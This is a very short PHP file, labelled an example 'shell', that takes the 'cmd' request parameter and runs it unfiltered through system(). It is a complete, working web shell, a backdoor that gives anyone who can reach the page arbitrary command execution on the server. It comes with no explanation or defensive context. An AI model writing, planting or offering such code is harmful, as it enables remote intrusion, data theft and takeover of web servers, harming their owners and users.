<?php
// Example "shell"
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>
